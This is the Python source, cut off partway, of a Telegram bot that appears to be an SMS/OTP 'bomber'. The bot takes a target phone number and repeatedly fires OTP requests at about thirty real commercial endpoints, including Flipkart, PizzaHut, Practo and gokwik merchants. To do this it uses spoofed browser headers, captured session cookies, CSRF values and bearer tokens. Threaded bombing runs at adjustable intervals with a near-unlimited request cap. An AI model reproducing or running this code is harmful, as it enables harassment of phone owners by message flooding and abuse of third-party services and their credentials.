import os
import logging
import asyncio
import json
import io
import threading
import time
import random
import requests
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
import aiohttp
from database import (
    init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
    get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids,
    update_user_phone, get_user_phone
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
PORT = int(os.getenv("PORT", 10000))
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")
if not WEBHOOK_URL:
    WEBHOOK_URL = "https://bomber-2hra.onrender.com"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Branding (HTML)
BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"

# ------------------------------------------------------------------
# Bombing configuration
# ------------------------------------------------------------------
API_INDICES = list(range(31))
DEFAULT_COUNTRY_CODE = "91"
BOMBING_INTERVAL_SECONDS = 8
MIN_INTERVAL = 1
MAX_INTERVAL = 60
MAX_REQUEST_LIMIT = 900000000000
TELEGRAM_RATE_LIMIT_SECONDS = 5
# Auto‑stop for normal users (10 minutes), admin/owner: no auto‑stop (set to None)
NORMAL_USER_AUTO_STOP_SECONDS = 10 * 60   # 10 minutes

bombing_active = {}          # user_id -> threading.Event
bombing_threads = {}         # user_id -> list of threads
user_intervals = {}          # user_id -> current interval
user_start_time = {}         # user_id -> start timestamp
global_request_counter = threading.Lock()
request_counts = {}          # user_id -> total requests

session = requests.Session()
BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*'
}

# ------------------------------------------------------------------
# Log Channel & Force Channels Configuration
# ------------------------------------------------------------------
LOG_CHANNEL_ID = -1003712674883   # Your private log channel ID

FORCE_CHANNELS = [
    {"name": "All Data Here", "link": "https://t.me/all_data_here", "id": -1003090922367},
    {"name": "OSINT Lookup", "link": "https://t.me/osint_lookup", "id": -1003698567122},
    # Add more channels here if needed
]

# ------------------------------------------------------------------
# User states for inline flow
# ------------------------------------------------------------------
STATE_NONE = 0
STATE_AWAITING_PHONE = 1
STATE_AWAITING_CONFIRM = 2
STATE_AWAITING_ADMIN_BAN = 3
STATE_AWAITING_ADMIN_UNBAN = 4
STATE_AWAITING_ADMIN_DELETE = 5
STATE_AWAITING_ADMIN_BROADCAST = 6
STATE_AWAITING_ADMIN_DM = 7
STATE_AWAITING_ADMIN_DM_TEXT = 8
STATE_AWAITING_ADMIN_ADDADMIN = 9
STATE_AWAITING_ADMIN_REMOVEADMIN = 10
STATE_AWAITING_ADMIN_LOOKUP = 11

# ------------------------------------------------------------------
# API functions (unchanged from original)
# ------------------------------------------------------------------
def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)

    url_urllib = [
        "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(cc) + "&nod=4&phone=" + pn,
        "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn,
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn
    ]
    if lim < len(url_urllib):
        try:
            urllib.request.urlopen(str(url_urllib[lim]), timeout=5)
            return True
        except (urllib.error.HTTPError, urllib.error.URLError, Exception):
            return False

    try:
        if lim == 3: # PharmEasy
            headers = {
                'Host': 'pharmeasy.in', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://pharmeasy.in/', 'Content-Type': 'application/json', 'Connection': 'keep-alive',
            }
            data = {"contactNumber": pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 4: # Hero MotoCorp
            cookies = {
                '_ga': 'GA1.2.1273460610.1561191565', '_gid': 'GA1.2.172574299.1561191565',
                'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
            }
            headers = {
                'Host': 'www.heromotocorp.com', 'Connection': 'keep-alive', 'Accept': '*/*',
                'Origin': 'https://www.heromotocorp.com', 'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/', 'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
                'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
                'mobile_no_otp': '', 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
            }
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 5: # IndiaLends
            cookies = {
                '_ga': 'GA1.2.1483885314.1559157646', '_fbp': 'fb.1.1559157647161.1989205138',
                'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs', '_gid': 'GA1.2.969623705.1560660444',
            }
            headers = {
                'Host': 'indialends.com', 'Connection': 'keep-alive', 'Accept': '*/*',
                'Origin': 'https://indialends.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Referer': 'https://indialends.com/personal-loan', 'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
                'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'
            }
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 6: # Flipkart 1
            headers = {
                'host': 'www.flipkart.com', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
                'accept': '*/*', 'accept-language': 'en-US,en;q=0.5', 'accept-encoding': 'gzip, deflate, br',
                'referer': 'https://www.flipkart.com/', 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop',
                'origin': 'https://www.flipkart.com', 'connection': 'keep-alive',
                'Content-Type': 'application/json; charset=utf-8'
            }
            data = {"loginId": [f"+{cc}{pn}"], "supportAllStates": True}
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 7: # Flipkart 2
            cookies = {
                'T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050', 'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
                'lux_uid': '155867904381892986', 'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
            }
            headers = {
                'Host': 'www.flipkart.com', 'Connection': 'keep-alive', 'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
                'Origin': 'https://www.flipkart.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*',
                'Referer': 'https://www.flipkart.com/', 'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
                'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'
            }
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 8: # Lenskart
            headers = {
                'Host': 'www.ref-r.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'Connection': 'keep-alive',
            }
            data = {'mobile': pn, 'submit': '1', 'undefined': ''}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 9: # Practo
            headers = {
                'X-DROID-VERSION': '4.12.5', 'API-Version': '2.0', 'user-agent': 'samsung SM-G9350 0 4.4.2',
                'client-version': 'Android-4.12.5', 'X-DROID-VERSION-CODE': '158', 'Accept': 'application/json',
                'client-name': 'Practo Android App', 'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'accounts.practo.com', 'Connection': 'Keep-Alive',
            }
            data = {
                'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}', 'fingerprint': '', 'device_name': 'samsung+SM-G9350'
            }
            response = session.post("https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()

        elif lim == 10: # PizzaHut
            headers = {
                'Host': 'm.pizzahut.co.in', 'content-length': '114', 'origin': 'https://m.pizzahut.co.in',
                'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5iTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4',
                'x-source-origin': 'PWAFW', 'content-type': 'application/json', 'accept': 'application/json, text/plain, */*',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'save-data': 'on', 'languagecode': 'en', 'referer': 'https://m.pizzahut.co.in/login',
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 'cookie': 'AKA_A2=A'
            }
            data = {"customer": {"MobileNo": pn, "UserName": pn, "merchantId": "98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 11: # Goibibo
            headers = {
                'host': 'www.goibibo.com', 'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.5',
                'accept-encoding': 'gzip, deflate, br', 'referer': 'https://www.goibibo.com/mobile/?sms=success',
                'content-type': 'application/x-www-form-urlencoded', 'connection': 'keep-alive',
                'upgrade-insecure-requests': '1'
            }
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 12: # Apollo Pharmacy
            headers = {
                'Host': 'www.apollopharmacy.in', 'accept': '*/*',
                'origin': 'https://www.apollopharmacy.in', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on',
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
                'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'
            }
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data, timeout=5)
            return "sent" in response.text.lower()

        elif lim == 13: # Ajio
            headers = {
                'Host': 'www.ajio.com', 'Connection': 'keep-alive', 'Accept': 'application/json',
                'Origin': 'https://www.ajio.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/json', 'Referer': 'https://www.ajio.com/signup',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'
            }
            data = {"firstName": "SpeedX", "login": "johnyaho@gmail.com", "password": "Rock@5star", "genderType": "Male", "mobileNumber": pn, "requestType": "SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text

        elif lim == 14: # AltBalaji
            headers = {
                'Host': 'api.cloud.altbalaji.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://lite.altbalaji.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
                'Content-Type': 'application/json;charset=UTF-8', 'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'
            }
            data = {"country_code": cc, "phone_number": pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.text == '24f467b24087ff48c96321786d89c69f'

        elif lim == 15: # Aala
            headers = {
                'Host': 'www.aala.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Origin': 'https://www.aala.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://www.aala.com/',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5'
            }
            data = {'email': f'{cc}{pn}', 'firstname': 'SpeedX', 'lastname': 'SpeedX'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, data=data, timeout=5)
            return 'code:' in response.text

        elif lim == 16: # Grab
            data = {
                'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'
            }
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code == 200

        elif lim == 17: # GheeAPI (gokwik.co - 19g6im8srkz9y)
            headers = {
                "accept": "application/json, text/plain, */*",
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
                "content-type": "application/json",
                "gk-merchant-id": "19g6im8srkz9y",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 18: # EdzAPI (gokwik.co - 19an4fq2kk5y)
            headers = {
                "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
                "content-type": "application/json",
                "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 19: # FalconAPI (api.breeze.in)
            headers = {
                "Content-Type": "application/json",
                "x-device-id": "A1pKVEDhlv66KLtoYsml3",
                "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
            }
            data = {
                "phoneNumber": pn,
                "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"
            }
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 20: # NeclesAPI (gokwik.co - 19g6ilhej3mfc)
            headers = {
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
                "Content-Type": "application/json",
                "gk-merchant-id": "19g6ilhej3mfc",
                "gk-signature": "645574",
                "gk-timestamp": "58581194"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 21: # KisanAPI (oidc.agrevolution.in)
            headers = {
                "Content-Type": "application/json"
            }
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "true" in response.text.lower()

        elif lim == 22: # PWAPI (api.penpencil.co)
            headers = {
                "Accept": "*/*",
                "Content-Type": "application/json",
                "randomid": "de6f4924-22f5-42f5-ad80-02080277eef7"
            }
            data = {
                "mobile": pn,
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 23: # KahatBook (api.khatabook.com)
            headers = {
                "Content-Type": "application/json",
                "x-kb-app-locale": "en",
                "x-kb-app-name": "Khatabook Website",
                "x-kb-app-version": "000100",
                "x-kb-new-auth": "false",
                "x-kb-platform": "web"
            }
            data = {
                "country_code": f"+{cc}",
                "phone": pn,
                "app_signature": "Jc/Zu7qNqQ2"
            }
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "success" in response.text.lower()

        elif lim == 24: # JockeyAPI (www.jockey.in)
            cookies = {
                "localization": "IN", "_shopify_y": "6556c530-8773-4176-99cf-f587f9f00905",
                "_tracking_consent": "3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ", "_ga": "GA1.1.377231092.1757430108",
                "_fbp": "fb.1.1757430108545.190427387735094641", "_quinn-sessionid": "a2465823-ceb3-4519-9f8d-2a25035dfccd",
                "cart": "hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06",
                "wishlist_id": "7531056362789hypmaaup", "wishlist_customer_id": "0",
                "_shopify_s": "d4985de8-eb08-47a0-9f41-84adb52e6298"
            }
            headers = {
                "accept": "*/*",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "origin": "https://www.jockey.in",
                "referer": "https://www.jockey.in/"
            }
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true"
            response = session.get(url, headers=headers, cookies=cookies, timeout=5)
            return response.status_code == 200

        elif lim == 25: # FasiinAPI (gokwik.co - 19kc37zcdyiu)
            headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
                "gk-merchant-id": "19kc37zcdyiu",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        # 26: VidyaKul
        elif lim == 26:
            cookies = {
                'gcl_au': '1.1.1308751201.1759726082',
                'initialTrafficSource': 'utmcsr=live|utmcmd=organic|utmccn=(not set)|utmctr=(not provided)',
                '__utmzzses': '1',
                '_fbp': 'fb.1.1759726083644.475815529335417923',
                '_ga': 'GA1.2.921745508.1759726084',
                '_gid': 'GA1.2.1800835709.1759726084',
                '_gat_UA-106550841-2': '1',
                '_hjSession_2242206': 'eyJpZCI6ImQ0ODFkMjIwLTQwMWYtNDU1MC04MjZhLTRlNWMxOGY4YzEyYSIsImMiOjE3NTk3MjYwODQyMDMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
                'trustedsite_visit': '1',
                'ajs_anonymous_id': '1681028f-79f7-458e-bf04-00aacdefc9d3',
                '_hjSessionUser_2242206': 'eyJpZCI6IjZhNWE4MzJlLThlMzUtNTNjNy05N2ZjLTI0MzNmM2UzNjllMSIsImNyZWF0ZWQiOjE3NTk3MjYwODQyMDEsImV4aXN0aW5nIjp0cnVlfQ==',
                'vidyakul_selected_languages': 'eyJpdiI6IkJzY1FUdUlodlRMVXhCNnE5V2RDT1E9PSIsInZhbHVlIjoiTTBcL2RKNmU2b1Fab1BnS3FqSDBHQktQVlk0SXRmczIxSGJrakhOaTJ5dllyclZiTk5FeVBGREE3dzVJbXI5T0oiLCJtYWMiOiI5MWU4NDViZDVhOTFjM2NmMmYyZjYwMmRiMmQyNGU4NTRlYjQ0MGM3ZTJmNjIzM2Q2M2ZhNTM0ZTVjMGUzZmUyIn0=',
                'WZRK_S_4WZ-K47-ZZ6Z': '%7B%22p%22%3A3%7D',
                'vidyakul_selected_stream': 'eyJpdiI6Ik0rb3pnN0gwc21pb1JsbktKNkdXOFE9PSIsInZhbHVlIjoibE9rWGhTXC8xQk1OektzXC9zNXlcLzloR0xjQ2hCMU5nT2pobU0rMU1FbjNSOD0iLCJtYWMiOiJiZjY4MWFhNWM2YzE4ZmViMDhlNWI2OGQ5YmNjM2I3NjNhOTJhZDc5ZDk3ZWE1MGM5OTA4MTA5ODhmMjRkZjk2In0=',
                '_ga_53F4FQTTGN': 'GS2.2.s1759726084$o1$g1$t1759726091$j53$l0$h0',
                'mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3A7b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22%24device_id%22%3A%227b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22mp_lib%22%3A%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%22bing%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D',
                'XSRF-TOKEN': 'eyJpdiI6IjFTYW9wNmVJQjY3TFpEU2RYeEdNbkE9PSIsInZhbHVlIjoidmErTnBFcU1JVHpFN2daOENRVG9aQ1RNU25tZnQ1dkM2M1hkQitSdVZRNGxtZUVpTFNvbjM2NlwvVEpLTkFqcCtiTHhNbjVDZWhSK3h1VytGQ0NiRFRRPT0iLCJtYWMiOiI1ZjM3ZDk1YzMwZTYzOTMzM2YwYzFhYTgyNjYzZDRmYWE4ZWQwMDdhYzM1MTdlM2NkNjgzZTNjNWNjZmI2ZWQ4In0=',
                'vidyakul_session': 'eyJpdiI6IlNDQWNpU2ZXMTEraENaaGtsQkJPMmc9PSIsInZhbHVlIjoicXFRbWVqNXhiejlwTFFpXC9OVmdWQkZsODhjUVpvenE0eTB3cGFiQ2F4ckx5Y3dcL3Z1S1NmNnhRNEduV01WT3Q1d2pKMlF3blpySU5YUU5vUldFTFI1dz09IiwibWFjIjoiOWFjNTM1NmQyMTg2YWE0MGZiMzljOGM0MDMzZjc4NWQyNzM0NTU4MzhkZjczNjU3OGNhNGM0Yjg2ZTEwZTJhMSJ9'
            }
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://vidyakul.com',
                'referer': 'https://vidyakul.com/explore-courses/class-10th/english-medium-biharboard',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0',
                'x-csrf-token': 'fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q',
                'x-requested-with': 'XMLHttpRequest'
            }
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()

        # 27: Aditya Birla Capital
        elif lim == 27:
            cookies = {
                '_gcl_au': '1.1.781134033.1759810407',
                '_gid': 'GA1.2.1720693822.1759810408',
                'sess_map': 'eqzbxwcubfayctusrydzbesabydweezdbateducxxdcrxstydtyzrbrtzsuqbdaswwuffravtvutuzuqcsvrtescduettszavexcraaevefqbwccdwvqucftswtzqxtbafdfycqwuqvryswywubrayfrbbfcszcywqsdyauttdaaybsq',
                '_ga': 'GA1.3.1436666301.1759810408',
                'WZRK_G': 'd74161bab0c042e8a9f0036c8570fe44',
                'mfKey': '14m4ctv.1759810410656',
                '_ga_DBHTXT8G52': 'GS2.1.s1759810408$o1$g1$t1759810411$j57$l0$h328048196',
                '_uetsid': 'fc23aaa0a33311f08dc6ad31d162998d',
                '_uetvid': 'fc23ea50a33311f081d045d889f28285',
                '_ga_KWL2JXMSG9': 'GS2.1.s1759810411$o1$g1$t1759810814$j54$l0$h0',
